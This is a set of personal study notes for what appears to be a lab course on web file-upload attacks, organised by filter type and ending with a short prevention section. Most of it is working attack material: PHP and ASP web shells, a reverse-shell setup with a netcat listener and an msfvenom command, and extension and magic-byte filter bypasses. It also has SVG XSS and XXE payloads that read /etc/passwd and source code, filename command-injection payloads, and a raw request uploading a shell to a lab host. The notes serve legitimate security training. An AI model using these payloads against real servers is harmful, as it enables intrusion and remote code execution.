# Intro to File Upload Attacks 

**CONTENT**


# Absent Validation

**TARGET URLS**  
http://SERVER_IP:PORT/  
http://SERVER_IP:PORT/index.php  
http://SERVER_IP:PORT/uploads/test.php

**UPLOADED FILE NAMES**  
shell.php  
test.php

**PAYLOADS / CODE**

```php
<?php echo "Hello HTB";?>
```

**TOOLS / EXTENSIONS**  
Wappalyzer  
Burp Intruder

**WEB TECHNOLOGIES IDENTIFIED**  
Apache  
PHP  
Ubuntu  
cdnjs  
jQuery

**ENDPOINTS / PATHS**  
/index.php  
/uploads/

```php
<?php system('hostname'); ?>
```
# Upload Exploitation

**TOOLS / RESOURCES**  
[https://github.com/Arrexel/phpbash](https://github.com/Arrexel/phpbash)  
[https://github.com/danielmiessler/SecLists/tree/master/Web-Shells](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells)  
[https://github.com/pentestmonkey/php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell)  
msfvenom  
netcat

**PATHS**  
/opt/useful/seclists/Web-Shells

**WEB SHELL — PHP (CUSTOM)**

```php
<?php system($_REQUEST['cmd']); ?>
```

**WEB SHELL — ASP.NET**

```asp
<% eval request('cmd') %>
```

**REVERSE SHELL — PHP (pentestmonkey CONFIG)**

```php
$ip = 'OUR_IP';     // CHANGE THIS
$port = OUR_PORT;   // CHANGE THIS
```

**NETCAT LISTENER**

```shell-session
nc -lvnp OUR_PORT
```

**MSFVENOM — PHP REVERSE SHELL**

```shell-session
msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
```

# Client-Side Validation 

**TARGET URLS**  
http://SERVER_IP:PORT/  
http://SERVER_IP:PORT/upload.php  
http://SERVER_IP:PORT/profile_images/shell.php?cmd=id

**ENDPOINTS / PATHS**  
/upload.php  
/profile_images/  
/profile_images/shell.php

**HTML — FILE INPUT**

```html
<input type="file" name="uploadFile" id="uploadFile" onchange="checkFile(this)" accept=".jpg,.jpeg,.png">
```

**JAVASCRIPT — CLIENT-SIDE VALIDATION FUNCTION**

```javascript
function checkFile(File) {
    if (extension !== 'jpg' && extension !== 'jpeg' && extension !== 'png') {
        $('#error_message').text("Only images are allowed!");
        File.form.reset();
        $("#submit").attr("disabled", true);
    }
}
```

**HTML — MODIFIED FILE INPUT (FUNCTION REMOVED)**

```html
<input type="file" name="uploadFile" id="uploadFile" accept=".jpg,.jpeg,.png">
```

**HTML — PROFILE IMAGE REFERENCE**

```html
<img src="/profile_images/shell.php" class="profile-image" id="profile-image">
```

**PAYLOAD — PHP WEB SHELL**

```php
<?php system($_REQUEST['cmd']); ?>
```


# Blacklist Filters 

**TARGET URLS**  
http://SERVER_IP:PORT/  
http://SERVER_IP:PORT/upload.php  
http://SERVER_IP:PORT/profile_images/shell.phtml?cmd=id

**ENDPOINTS / PATHS**  
/upload.php  
/profile_images/  
/profile_images/shell.phtml

**BACK-END BLACKLIST VALIDATION (PHP)**

```php
$fileName = basename($_FILES["uploadFile"]["name"]);
$extension = pathinfo($fileName, PATHINFO_EXTENSION);
$blacklist = array('php', 'php7', 'phps');

if (in_array($extension, $blacklist)) {
    echo "File type not allowed";
    die();
}
```

**TOOLS / RESOURCES**  
Burp Intruder  
Burp Repeater  
[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst)  
[https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt)

**BURP INTRUDER — FUZZ POSITION**  
filename="HTB.php"

**ALLOWED EXTENSION USED**  
.phtml

**PAYLOAD — PHP WEB SHELL**

```php
<?php system($_REQUEST['cmd']); ?>
```


# Whitelist Filters

**TARGET URLS**  
http://SERVER_IP:PORT/  
http://SERVER_IP:PORT/upload.php  
http://SERVER_IP:PORT/profile_images/shell.jpg.php  
http://SERVER_IP:PORT/profile_images/shell.php.jpg

**ENDPOINTS / PATHS**  
/upload.php  
/profile_images/

**WHITELIST VALIDATION — PHP (WEAK REGEX)**

```php
$fileName = basename($_FILES["uploadFile"]["name"]);

if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) {
    echo "Only images are allowed";
    die();
}
```

**WHITELIST VALIDATION — PHP (STRICT REGEX)**

```php
if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) { ...SNIP... }
```

**DOUBLE EXTENSION FILENAME**  
shell.jpg.php

**REVERSE DOUBLE EXTENSION FILENAME**  
shell.php.jpg

**WEB SERVER CONFIGURATION — APACHE PHP HANDLER**

```xml
<FilesMatch ".+\.ph(ar|p|tml)">
    SetHandler application/x-httpd-php
</FilesMatch>
```

**PAYLOAD — PHP WEB SHELL**

```php
<?php system($_REQUEST['cmd']); ?>
```

**CHARACTER INJECTION LIST**  
%20  
%0a  
%00  
%0d0a  
/  
.  
.  
…  
:

**CUSTOM WORDLIST GENERATION SCRIPT**

```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
```

**TOOLS / RESOURCES**  
Burp Intruder  
[https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt)  
[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst)


```
_.php  
.php3  
.php4  
.php5  
.php7  
.pht  
.phtml  
.phar  
.phps  
.phpt  
.pgif  
.pjpg  
.pjpeg  
.inc  
.php.jpg  
.php.jpeg  
.php.png  
.php.gif  
.php.bmp  
.php.svg  
.php.webp  
.php.tiff  
.php.ico  
.jpg.php  
.jpeg.php  
.png.php  
.gif.php  
.svg.php  
.PHP  
.Php  
.PhP  
.pHp  
.pHP  
.PHp  
.phP  
.php%00.jpg_

_.php%00.png  
.php%00.gif  
.php\x00.jpg  
.php%20.jpg  
.php .jpg  
.php..jpg  
.php%0a.jpg  
.php%0d.jpg  
.phtml  
.php5  
.php7  
.shtml  
.asa  
.cer  
.asax  
.swf  
.jpg  
.jpeg  
.png  
.gif  
.bmp  
.svg  
.webp  
.tiff  
.tif  
.ico  
.jfif  
.pjpeg  
.pjp  
.jpg.php  
.jpeg.php  
.png.php  
.gif.php  
.bmp.php  
.svg.php  
.php.jpg.php  
.jpg.php.jpg  
.php.png.jpg  
.php;.jpg  
.php:.jpg  
.php_.jpg  
.PHP.jpg  
.Php.png  
.pHp.gif  
.htaccess  
.htpasswd  
.ini  
.config  
.conf  
.phar  
.zip  
.tar  
.php1  
.php2  
.php6  
.php8  
.phps  
.phptml  
.phar.jpg  
.phar.jpeg  
.phar.png  
.phar.gif  
.jpg.phar  
.jpeg.phar  
.png.phar  
.gif.phar_
```
# Type Filters 

**TARGET URLS**  
http://SERVER_IP:PORT/  
http://SERVER_IP:PORT/upload.php  
http://SERVER_IP:PORT/profile_images/shell.php?cmd=id

**ENDPOINTS / PATHS**  
/upload.php  
/profile_images/me.svg
/profile_images/shell.php

**CONTENT-TYPE VALIDATION — PHP**

```php
$type = $_FILES['uploadFile']['type'];

if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
    echo "Only images are allowed";
    die();
}
```

**MIME-TYPE VALIDATION — PHP**

```php
$type = mime_content_type($_FILES['uploadFile']['tmp_name']);

if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
    echo "Only images are allowed";
    die();
}
```

**CONTENT-TYPE WORDLIST DOWNLOAD**

```bash
wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Discovery/Web-Content/web-all-content-types.txt
```

**IMAGE CONTENT-TYPE FILTERING**

```bash
cat web-all-content-types.txt | grep 'image/' > image-content-types.txt
```

**MAGIC BYTES — GIF HEADER**

```
GIF8
```

**PAYLOAD — PHP WEB SHELL WITH MAGIC BYTES**

```php
GIF8
<?php system($_REQUEST['cmd']); ?>
```

**TOOLS / RESOURCES**  
Burp Intruder  
SecLists

```
Content-Disposition: form-data; name="uploadFile"; filename="shell.jpeg.phar"
Content-Type: image/jpeg

GIF8
<?php system($_REQUEST['cmd']); ?>
```

# Limited File Uploads 

**TOOLS**  
exiftool

**EXIFTOOL — METADATA XSS INJECTION**

```bash
exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
```

**SVG — STORED XSS PAYLOAD**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
```

**SVG — XXE FILE DISCLOSURE (/etc/passwd)**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

**SVG — XXE PHP SOURCE DISCLOSURE**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///flag.txt">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text x="10" y="20">&xxe;</text>
</svg>
```

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///flag.txt">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text x="10" y="20">&xxe;</text>
</svg>

```

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text x="10" y="20">&xxe;</text>
</svg>
```

```
echo "BASE64_HERE" | base64 -d
```


# Other Upload Attacks

**FILENAME — COMMAND INJECTION PAYLOADS**  
file$(whoami).jpg  
file`whoami`.jpg  
file.jpg||whoami

**FILENAME — XSS PAYLOAD**

**FILENAME — SQL INJECTION PAYLOAD**  
file';select+sleep(5);--.jpg

**WINDOWS RESERVED CHARACTERS**  
|  
<

?

**WINDOWS RESERVED FILENAMES**  
CON  
COM1  
LPT1  
NUL

**WINDOWS 8.3 FILENAME EXAMPLES**  
HAC~1.TXT  
HAC~2.TXT  
WEB~1.CON


# Preventing File Upload Vulnerabilities

**EXTENSION VALIDATION — PHP (BLACKLIST + WHITELIST)**

```php
$fileName = basename($_FILES["uploadFile"]["name"]);

// blacklist test
if (preg_match('/^.*\.ph(p|ps|ar|tml)/', $fileName)) {
    echo "Only images are allowed";
    die();
}

// whitelist test
if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) {
    echo "Only images are allowed";
    die();
}
```

**CONTENT VALIDATION — PHP (EXTENSION + CONTENT-TYPE + MIME)**

```php
$fileName = basename($_FILES["uploadFile"]["name"]);
$contentType = $_FILES['uploadFile']['type'];
$MIMEtype = mime_content_type($_FILES['uploadFile']['tmp_name']);

// whitelist test
if (!preg_match('/^.*\.png$/', $fileName)) {
    echo "Only PNG images are allowed";
    die();
}

// content test
foreach (array($contentType, $MIMEtype) as $type) {
    if (!in_array($type, array('image/png'))) {
        echo "Only PNG images are allowed";
        die();
    }
}
```

**HTTP SECURITY HEADERS**  
Content-Disposition: attachment  
Content-Type  
X-Content-Type-Options: nosniff

**PHP CONFIGURATION**  
disable_functions  
exec  
shell_exec  
system  
passthru  
open_basedir


http://94.237.123.185:39491/contact/user_feedback_submissions/260202_shell.phar.jpg
# skill

```
POST /contact/upload.php HTTP/1.1
Host: 94.237.120.74:57731
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://94.237.120.74:57731/contact/
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=----geckoformboundary1c1c8c2ce157a122e9be8ff63b9e551
Content-Length: 260
Origin: http://94.237.120.74:57731
DNT: 1
Connection: keep-alive
Sec-GPC: 1
Priority: u=0

------geckoformboundary1c1c8c2ce157a122e9be8ff63b9e551
Content-Disposition: form-data; name="uploadFile"; filename="me.phar.jpg"
Content-Type: image/jpeg

ÿØÿà
<?php system($_REQUEST['cmd']); ?>

------geckoformboundary1c1c8c2ce157a122e9be8ff63b9e551--

```


#
#
#